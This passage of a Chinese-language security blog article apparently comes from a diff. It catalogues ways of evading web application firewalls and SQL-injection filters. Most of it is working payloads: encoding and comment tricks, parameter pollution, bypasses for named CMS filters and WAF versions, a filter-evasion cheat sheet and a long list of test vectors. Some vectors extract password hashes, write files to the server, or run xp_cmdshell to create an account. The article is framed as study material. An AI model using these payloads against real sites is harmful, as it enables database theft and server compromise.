+3. 架构/网络设计工具当运行在反向代理模式他们被用来分配职能集中控制虚拟基础结构等。 
+4. WEB应用加固工具这些功能增强被保护Web应用的安全性它不仅能够屏蔽WEB应用固有弱点而且能够保护WEB应用编程错误导致的安全隐患。 
+</code></pre>
+
+<p>WAF的常见特点</p>
+
+<pre><code>异常检测协议拒绝不符合HTTP标准的请求 
+增强的输入验证代理和服务端的验证而不只是限于客户端验证 
+白名单&amp;黑名单白名单适用于稳定的We应用黑名单适合处理已知问题 
+基于规则和基于异常的保护基于规则更多的依赖黑名单机制基于异常更为灵活 
+状态管理重点进行会话保护 
+另还有Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 
+</code></pre>
+
+<p>如果是对于扫描器WAF有其识别之道</p>
+
+<p>扫描器识别主要由以下几点</p>
+
+<pre><code>1) 扫描器指纹(head字段/请求参数值)以wvs为例会有很明显的Acunetix在内的标识 
+2)  单IP+ cookie某时间段内触发规则次数 
+3)  隐藏的链接标签等(&lt;a&gt;) 
+4)  Cookie植入 
+5)  验证码验证扫描器无法自动填充验证码 
+6)  单IP请求时间段内Webserver返回http状态404比例 扫描器探测敏感目录基于字典找不到文件则返回404 
+</code></pre>
+
+<h2>0x02 绕过WAF的方法</h2>
+
+<hr />
+
+<p>从笔者目前找到的资料来看可以把这些绕过waf的技术分为9类包含从初级到高级技巧</p>
+
+<pre><code>a) 大小写混合 
+b)替换关键字 
+c)使用编码 
+d)使用注释 
+e)等价函数与命令 
+f)使用特殊符号 
+g)HTTP参数控制 
+h)缓冲区溢出 
+i)整合绕过 
+</code></pre>
+
+<h3>a) 大小写绕过</h3>
+
+<p>大小写绕过用于只针对小写或大写的关键字匹配技术正则表达式/express/i 匹配时大小写不敏感便无法绕过这是最简单的绕过技术</p>
+
+<pre><code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4  
+</code></pre>
+
+<p>示例场景可能的情况为filter的规则大小写敏感现在直接使用这种绕过技术成功的可能性已经不高了吧</p>
+
+<h3>b)替换关键字</h3>
+
+<p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+
+<pre><code>z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 
+</code></pre>
+
+<p>替换关键字同样是很基础的技术也可以构造得更复杂SeLSeselectleCTecT关键要看正则表达式会进行几次匹配处理了</p>
+
+<h3>c)使用编码</h3>
+
+<h4>1.URL编码</h4>
+
+<p>在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29</p>
+
+<p>普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</p>
+
+<pre><code>page.php?id=1%252f%252a*/UNION%252f%252a/SELECT 
+</code></pre>
+
+<h4>2.十六进制编码</h4>
+
+<pre><code>z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
+</code></pre>
+
+<p>示例代码中前者是对单个字符十六进制编码后者则是对整个字符串编码对整个字符串编码相对来说较少见一点</p>
+
+<h4>3.Unicode编码</h4>
+
+<p>Unicode有所谓的标准编码和非标准编码假设我们用的utf-8为标准编码那么西欧语系所使用的就是非标准编码了</p>
+
+<p>看一下常用的几个符号的一些Unicode编码</p>
+
+<pre><code>单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
+
+空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
+
+左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
+
+右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
+</code></pre>
+
+<p>举例：</p>
+
+<pre><code>?id=10%D6'%20AND%201=2%23　　
+
+SELECT 'Ä'='A'; #1
+</code></pre>
+
+<p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\'，那么就变成了%D6%5C'，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。</p>
+
+<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过。</p>
+
+<p>另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下。</p>
+
+<p>常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子。</p>
+
+<h3>d) 使用注释</h3>
+
+<p>看一下常见的用于注释的符号有哪些</p>
+
+<pre><code>//, -- , /**/, #, --+,--  -, ;--a 
+</code></pre>
+
+<h4>1.普通注释</h4>
+
+<pre><code>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4
+'union%a0select pass from users# 
+</code></pre>
+
+<p>/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别#、--+用于终结语句的查询</p>
+
+<h4>2.内联注释</h4>
+
+<p>相比普通注释内联注释用的更多/<em>!content</em>/只有MySQL会正常识别content的内容其他 </p>
+
+<pre><code>index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 
+?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 
+</code></pre>
+
+<p>两个示例中前者使用内联注释后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分要做到这一点后面讨论的特殊符号也能实现当然前提是包括/、*在内的这些字符能正常使用。</p>
+
+<h3>e)等价函数与命令</h3>
+
+<p>有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用</p>
+
+<h4>1.函数或变量</h4>
+
+<pre><code>hex()、bin() ==&gt; ascii()
+sleep() ==&gt;benchmark()
+concat_ws()==&gt;group_concat()
+mid()、substr() ==&gt; substring()
+@@user ==&gt; user()
+@@datadir ==&gt; datadir()
+</code></pre>
+
+<p>举例substring()和substr()无法使用时</p>
+
+<pre><code>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 
+</code></pre>
+
+<p>或者</p>
+
+<pre><code>substr((select 'password'),1,1) = 0x70 
+strcmp(left('password',1), 0x69) = 1 
+strcmp(left('password',1), 0x70) = 0 
+strcmp(left('password',1), 0x71) = -1 
+</code></pre>
+
+<p>上述这几个示例用于说明有时候当某个函数不能使用时还可以找到其他的函数替代其实现至于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p>
+
+<h4>2.符号</h4>
+
+<p>and和or有可能不能使用可以试下&amp;&amp;和||能不能用还有=不能使用的情况可以考虑尝试&lt;、>因为如果不小于又不大于那便是等于了</p>
+
+<p>再看一下用得很多的空格可以使用如下符号代替其使用</p>
+
+<pre><code>%20 %09 %0a %0b %0c %0d %a0 /**/ 
+</code></pre>
+
+<h4>3.生僻函数</h4>
+
+<p>MySQL/PostgreSQL支持XML函数</p>
+
+<pre><code>Select UpdateXML('&lt;script x=_&gt;&lt;/script&gt; ','/script/@x/','src=//evil.com');
+?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
+SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
+?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+</code></pre>
+
+<p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能而且代价太大因此黑名单的确是更适合处理已知的情况</p>
+
+<h3>f) 特殊符号</h3>
+
+<p>这里我把非字母数字的字符都规在了特殊符号一类这些符号有特殊的含义和用法涉及信息量比前面提到的几种都要多</p>
+
+<p>先看下drops上<a><a href="http://drops.wooyun.org/tips/132">waf的绕过技巧</a>一文使用的几个例子</p></p>
+
+<pre><code>1.使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
+2.神奇的"-+."，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
+3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量
+4.Mysql function() as xxx  也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制
+</code></pre>
+
+<p>
+  可见使用这些字符的确是能做很多事也证实了那句老话只有想不到没有做不到
+</p>
+
+<p>
+  笔者搜罗了部分可能发挥大作用的字符(这里未包括'、*、/等在内考虑到前面已经出现较多次了)
+</p>
+
+<pre><code>`、~、!、@、%、()、[]、.、-、+ 、|、%00
+</code></pre>
+
+<p>
+  举例
+</p>
+
+<p>
+  关键字拆分
+</p>
+
+<pre><code>'se'+'lec'+'t'
+%S%E%L%E%C%T 1
+1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
+</code></pre>
+
+<p>
+  !和()' or --+2=- -!!!'2
+</p>
+
+<pre><code>id=1+(UnI)(oN)+(SeL)(EcT)
+</code></pre>
+
+<p>
+  //有看到说Access中,”[]”用于表和列,”()”用于数值也可以做分隔
+</p>
+
+<p>
+  本节最后再给出一些和这些字符多少有点关系的操作符供参考
+</p>
+
+<pre><code>&gt; &gt; , &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
+</code></pre>
+
+<p>
+  使用这些"特殊符号"实现绕过是一件很细微的事情一方面各数据库对符号的处理是不尽相同的另一方面你得充分了解这些符号的特性和使用方法才能会考虑利用其实现绕过
+</p>
+
+<h3>
+  g) HTTP参数控制
+</h3>
+
+<p>
+  这里HTTP参数控制除了对查询语句的参数进行篡改还包括HTTP方法、HTTP头的控制
+</p>
+
+<h4>
+  1.HPP(HTTP Parameter Polution)
+</h4>
+
+<p>
+  举例
+</p>
+
+<pre><code>/?id=1;select+1&id=2,3+from+users+where+id=1—
+/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
+</code></pre>
+
+<p>
+  HPP又称做重复参数污染最简单的就是?uid=1&uid=2&uid=3对于这种情况不同的Web服务器处理方式如下
+</p>
+
+<p>
+  <img src="http://static.wooyun.org/201402/2014022613524357191.jpg" alt="2014022613524357191.jpg" />
+</p>
+
+<p>
+  具体WAF如何处理要看其设置的规则不过就示例中感觉最后一个来看有较大可能绕过
+</p>
+
+<h4>
+  2.HPF(HTTP Parameter Fragment)
+</h4>
+
+<p>
+  这种方法是HTTP分割注入同CRLF略有相似之处(使用控制字符%0a、%0d等换行)
+</p>
+
+<p>
+  举例　
+</p>
+
+<pre><code>/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
+select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
+</code></pre>
+
+<p>
+  看完上面两个示例发现和HPP最后一个示例很像不同之处在于参数不一样这里是在不同的参数之间进行分割结果到了数据库执行查询时再合并语句。
+</p>
+
+<h4>
+  3.HPC(HTTP Parameter Contamination)
+</h4>
+
+<p>
+  这一概念见于<a href="http://www.exploit-db.com/papers/17934/">Beyond SQLi: Obfuscate and Bypass</a>这里Contamination意为污染
+</p>
+
+<p>
+  RFC2396定义了如下一些字符
+</p>
+
+<pre><code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()  
+Reserved : ; / ? : @ & = + $ ,  
+Unwise : { } | \ ^ [ ] `
+</code></pre>
+
+<p>
+  不同的Web服务器处理处理构造得特殊请求时有不同的逻辑
+</p>
+
+<p>
+  <img src="http://static.wooyun.org/201402/2014022613570037001.jpg" alt="2014022613570037001.jpg" />
+</p>
+
+<p>
+  以魔术字符%为例Asp/Asp.net会受到影响
+</p>
+
+<p>
+  <img src="http://static.wooyun.org/201402/2014022613574878521.jpg" alt="2014022613574878521.jpg" />
+</p>
+
+<h3>
+  h) 缓冲区溢出(Advanced)
+</h3>
+
+<p>
+  缓冲区溢出用于对付WAF在内的软件本身有不少WAF是C语言写的而C语言自身没有缓冲区保护机制因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug从而实现绕过
+</p>
+
+<p>
+  举例
+</p>
+
+<pre><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+</code></pre>
+
+<p>
+  示例0xA*1000指0xA后面”A"重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出
+</p>
+
+<h3>
+  i) 整合绕过
+</h3>
+
+<p>
+  整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部和另一方面则是多种技术的使用创造了更多的可能性组合除非每一种技术单独都无法使用否则它们能产生比自身大得多的能量。
+</p>
+
+<p>
+  举例
+</p>
+
+<pre><code>z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…
+id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -
+?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  
+</code></pre>
+
+<h2>
+  0x03 SQLi Filter的实现及Evasion
+</h2>
+
+<hr />
+
+<p>
+  SQL Injection时用得最多的一些关键字如下
+</p>
+
+<pre><code>and, or, union, where, limit, group by, select, ', hex, substr, white space
+</code></pre>
+
+<p>
+  对它们的检测完整正则表达式为
+</p>
+
+<pre><code>preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
+</code></pre>
+
+<p>
+  Filter Evasion在<a href="http://www.exploit-db.com/papers/17934/">Beyond SQLi: Obfuscate and Bypass</a>和<a href="http://drops.wooyun.org/tips/123">Mysql注入科普</a>可以看到比较详细的解释
+</p>
+
+<p>
+  这里只做简化的说明其应对方式依次为 
+</p>
+
+<pre><code>***note***:"=&gt;"左边表示会被Filtered的语句，"=&gt;"右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字
+
+and =&gt; && 　　or =&gt; ||
+
+union select user, password from users　　 =&gt;　　1 || (select user from users where user_id = 1) = 'admin
+
+1 || (select user from users where user_id = 1) = 'admin'　　=&gt;　　1 || (select user from users limit 1) = 'admin
+
+1 || (select user from users limit 1) = 'admin' =&gt;　　1 || (select user from users group by user_id having user_id = 1) = 'admin'
+1 || (select user from users group by user_id having user_id = 1) = 'admin' =&gt;　1 || (select substr(group_concat(user_id),1,1) user from users )=1
+1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =&gt;  1 || 1 = 1 into outfile 'result.txt'　或者  1 || substr(user,1,1) = 'a'　
+1 || (select substr(group_concat(user_id),1,1) user from users) = 1 　=&gt;　　1 || user_id is not null 或者 1 || substr(user,1,1) = 0x61
+　　　或者 1 || substr(user,1,1) = unhex(61)　　//　' Filtered
+1 || substr(user,1,1) = unhex(61)　　=&gt;   1 || substr(user,1,1) = lower(conv(11,10,36))
+1 || substr(user,1,1) = lower(conv(11,10,36)) =&gt;　　1 || lpad(user,7,1)
+1 || lpad(user,7,1)　　=&gt;　　1%0b||%0blpad(user,7,1)　　// ' ' Filtered
+</code></pre>
+
+<p>
+  从上面给出的示例来看没有绝对的过滤即便平时构建一个正常SQL语句的全部关键字都被过滤了我们也还是能找到Bypass的方法。普世的阳光和真理尚且照不到每一个角落人为构建出来的一个工具WAF就更加不可能尽善尽美了。我们可以相信WAF能为我们抵挡很多攻击但是绝不能百分之一百的依赖它就算它有着世上最为健全的规则它本身也是会存在缺陷的。
+</p>
+
+<p>
+  从前面到现在基本上每条注入语句中都有数字如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉这就有点棘手了不过办法总是有的
+</p>
+
+<p>
+  <img src="http://static.wooyun.org/201402/2014022614064414576.png" alt="2014022614064414576.png" />
+</p>
+
+<p>
+  <img src="http://static.wooyun.org/201402/2014022614071092308.png" alt="2014022614071092308.png" />
+</p>
+
+<p>
+  上面两张图第一张是不能使用数字时通过使用数学函数得到某个数字的值第二张则是这些数字对应的36进制的值因此有时候一个很简单的表达式可能会很复杂或者非常长其实际就是计算mod(a,b)
+</p>
+
+<pre><code>(mod(length(trim(leading(concat(lower(conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(), pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi())),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*version())+true,pi()*pi(),pow(pi(), pi()))),lower(conv(ceil((pi()+ceil(pi()))*pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi())*ceil(pi()+pi()),pi()*pi(),pow(pi(),pi()))),conv(ceil(pi()*version()),pi()*pi(),pow(pi(),pi())),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(version()*version()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi())))))from(pass))),length(pass))
+</code></pre>
+
+<h2>
+  0x04 延伸及测试向量示例
+</h2>
+
+<hr />
+
+<pre><code>a) CMS绕过实例
+b) WAF绕过示例
+c) SQLi Filter Evasion Cheat sheet
+d) 测试向量
+</code></pre>
+
+<h3>
+  a) Web应用绕过示例
+</h3>
+
+<h4>
+  1. e107 CMS
+</h4>
+
+<pre><code>$inArray = array("'", ";", "/**/", "/UNION/", "/SELECT/", "AS "); 
+if (strpos($_SERVER['PHP_SELF'], "trackback") === false) { 
+foreach($inArray as $res) { 
+if(stristr($_SERVER['QUERY_STRING'], $res)) { 
+die("Access denied."); 
+}}}
+</code></pre>
+
+<p>
+  Bypass:
+</p>
+
+<pre><code>vuln.php/trackback?inject=UNI%6fN SELECT
+</code></pre>
+
+<h4>
+  2. PHP-Nuke CMS
+</h4>
+
+<pre><code>if(isset($_SERVER['QUERY_STRING']) 
+&& (!stripos($_SERVER['QUERY_STRING'], "ad_click"))) { 
+$queryString = $_SERVER['QUERY_STRING']; 
+if ( stripos($queryString, '%20union%20') 
+OR stripos($queryString, '/*') 
+OR stripos($queryString, '*/union/*') 
+OR stripos($queryString, '+union+') 
+OR stripos($queryString, 'concat')) { die('Illegal Operation'); }
+</code></pre>
+
+<p>
+  Bypass:
+</p>
+
+<pre><code>vuln.php?inject=%a0UNI%6fN(SELECT'ad_click'
+</code></pre>
+
+<h4>
+  3. TYPO3 CMS
+</h4>
+
+<pre><code>$val = str_replace(array("'"," ","("),"",$arrFields[$fname]); // basic defence
+</code></pre>
+
+<p>
+  Bypass:
+</p>
+
+<pre><code>vuln.php?id=1/**/union%a0select/**/1,pass,3`a`from`users`
+</code></pre>
+
+<h3>
+  b) WAF绕过示例
+</h3>
+
+<h4>
+  1. ModSecurity CRS 2.0.9 
+</h4>
+
+<pre><code>1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1
+1'union/*!select*/pass,load_file(0x123456789)from users-- -
+</code></pre>
+
+<h4>
+  2. PHPIDS 0.6.4 
+</h4>
+
+<pre><code>foo'!=@a:=0x1 div'1a false != true 　　//auth bypass
+foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0
+a'in(true) and false */*!(true)union#newline select pass`alias`from users where true*/* n'1
+</code></pre>
+
+<h4>
+  3. GreenSQL 1.3.0 
+</h4>
+
+<p>
+  检测关键字：<code>union, information_schema, into outfile, current_user, current_date, version</code>
+</p>
+
+<p>
+  检测函数：<code>mid(), substring(), substr(), load_file(), benchmark(), user(), database(), version()</code>
+</p>
+
+<pre><code>adm' 'in' or 1='1        // auth bypass
+'-(1)union(select table_name,load_file('/tmp/test'),@@version
+from /*! information_schema.tables */);%00    //select union
+'-'' into%a0outfile '/tmp/test   //write to file
+</code></pre>
+
+<h3>
+  c) SQLi Filter Evasion Cheat sheet
+</h3>
+
+<pre><code>#注释
+' or 1=1#
+' or 1=1/* (MySQL &lt; 5.1)
+' or 1=1;%00
+' or 1=1 union select 1,2 as `
+' or#newline
+' /*!50000or*/1='1
+' /*!or*/1='1
+
+#前缀
++ – ~ !
+' or –+2=- -!!!'2
+
+#操作符：
+^, =, !=, %, /, *, &, &&, |, ||, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
+
+#空格
+%20 %09 %0a %0b %0c %0d %a0 /**/
+'or+(1)sounds/**/like"1"–%a0-
+'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
+
+#有引号的字符串
+SELECT 'a'
+SELECT "a"
+SELECT n'a'
+SELECT b'1100001′
+SELECT _binary'1100001′
+SELECT x'61′
+
+#没有引号的字符串
+　'abc' = 0×616263
+　　' and substr(data,1,1) = 'a'#
+　　' and substr(data,1,1) = 0x61 # 0x6162
+　　' and substr(data,1,1) = unhex(61)    # unhex(6162)
+　　' and substr(data,1,1) = char(97  )# char(97,98)
+　　' and substr(data,1,1) = 'a'#
+　　' and hex(substr(data,1,1)) = 61#
+　　' and ascii(substr(data,1,1)) = 97#
+　　' and ord(substr(data,1,1)) = 97# 
+　　' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
+
+#别名
+select pass as alias from users
+select pass`alias alias`from users
+
+#字型
+' or true = '1 # or 1=1
+' or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
+' or '1 # or true
+#操作符字型
+select * from users where 'a'='b'='c'
+select * from users where ('a'='b')='c'
+select * from users where (false)='c'
+
+#认真绕过'='
+select * from users where name = "="
+select * from users where false = "
+select * from users where 0 = 0
+select * from users where true#函数过滤器ascii (97)
+load_file/*foo*/(0×616263)
+
+#用函数构建字符串
+'abc' = unhex(616263)
+'abc' = char(97,98,99)
+ hex('a') = 61
+ ascii('a') = 97
+ ord('a') = 97
+'ABC' = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
+
+#特殊字符
+　　aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a
+　　des_encrypt(1,2) // 侴Ò/镏k
+　　@@ft_boolean_syntax // + -&gt;&lt;()~*:""&|
+　　@@date_format // %Y-%m-%d
+　　@@innodb_log_group_home_dir // .\
+
+@@new: 0
+@@log_bin: 1
+#提取子字符串substr('abc',1,1) = 'a'
+substr('abc' from 1 for 1) = 'a'
+substring('abc',1,1) = 'a'
+substring('abc' from 1 for 1) = 'a'
+mid('abc',1,1) = 'a'
+mid('abc' from 1 for 1) = 'a'
+lpad('abc',1,space(1)) = 'a'
+rpad('abc',1,space(1)) = 'a'
+left('abc',1) = 'a'
+reverse(right(reverse('abc'),1)) = 'a'
+insert(insert('abc',1,0,space(0)),2,222,space(0)) = 'a'
+space(0) = trim(version()from(version()))
+
+#搜索子字符串
+locate('a','abc')
+position('a','abc')
+position('a' IN 'abc')
+instr('abc','a')
+substring_index('ab','b',1)
+
+#分割字符串
+length(trim(leading 'a' FROM 'abc'))
+length(replace('abc', 'a', "))
+
+#比较字符串
+strcmp('a','a')
+mod('a','a')
+find_in_set('a','a')
+field('a','a')
+count(concat('a','a'))
+
+#字符串长度
+length()
+bit_length()
+char_length()
+octet_length()
+bit_count()
+
+#关键字过滤
+Connected keyword filtering
+(0)union(select(table_name),column_name,…
+0/**/union/*!50000select*/table_name`foo`/**/…
+0%a0union%a0select%09group_concat(table_name)….
+0′union all select all`table_name`foo from`information_schema`. `tables`
+
+#控制流
+case 'a' when 'a' then 1 [else 0] end
+case when 'a'='a' then 1 [else 0] end
+if('a'='a',1,0)
+ifnull(nullif('a','a'),1)
+</code></pre>
+
+<h3>
+  d) 测试向量
+</h3>
+
+<pre><code>%55nion(%53elect 1,2,3)-- -
+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinctROW+select+
+-15+(uNioN)+(sElECt)
+-15+(UnI)(oN)+(SeL)(ecT)+
+
+id=1+UnIOn/**/SeLect 1,2,3—
+id=1+UNIunionON+SELselectECT 1,2,3—
+id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
+id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
+id=1+un/**/ion+sel/**/ect+1,2,3--
+id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
+id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
+id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
+id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x
+
+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
+/*!union*/+/*!select*/+1,2,3—
+/*!UnIOn*//*!SeLect*/+1,2,3—
+un/**/ion+sel/**/ect+1,2,3—
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
+ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
+
+?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
+?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
+?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
+id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/
+
+id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES-- 
+id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--
+
+SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
+SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way
+
+select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
+select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
+select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
+select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
+select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
+
+/?id=1+union+(select'1',concat(login,hash)from+users)
+/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
+
+?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
+id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+id=10 and 1=0/(select top 1 table_name from information_schema.tables)
+
+id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
+id=-725+UNION+SELECT+1,version(),3,4,5--sp_password //使用sp_password隐藏log中的请求
+</code></pre>
+
+<h2>
+  0x05 本文小结
+</h2>
+
+<hr />
+
+<p>
+  本文内容到这里内容差不多就算是完了回顾一下本文内容主要从三个方面展开绕过WAF的方法、Filter的实现机制和Evasion措施、测试示例和向量。本文的第二部分”绕过WAF的方法“花了较多时间需要参照已有的总结进行自己的总结并给出示例第三、四两部分更多的是粘贴已收集到的向量因此较快。本文内容和篇幅较多涉及信息量很大但是仍有许多不完善或遗漏的地方。
+</p>
+
+<p>
+  最后再说一下昨天晚上和园长谈及本文内容时他表示像缓冲区溢出绕过waf这些针对的是传统的waf而且关键字替换也不仅仅是处理select这么简单现在一种很重要的处理方式是编码笔者听后确实感觉受教了。需要进一步学习的还有很多很多云waf和传统waf之间千丝万缕的关系也还有待进一步去了解。前几天朋友说前几天他现在过滤都不太使用正则表达式了那样效率太低使用抽象语法树AST检测SQL注入曾经以为只有学院派会使用的现在已经发生在身边了。
+</p>
+
+<p>
+  笔者作为新手抱着学习的态度写出本文希望懂这方面的朋友前辈可以多指点。
+</p>
+
+<h2>
+  0x06 参考资料
+</h2>
+
+<hr />
+
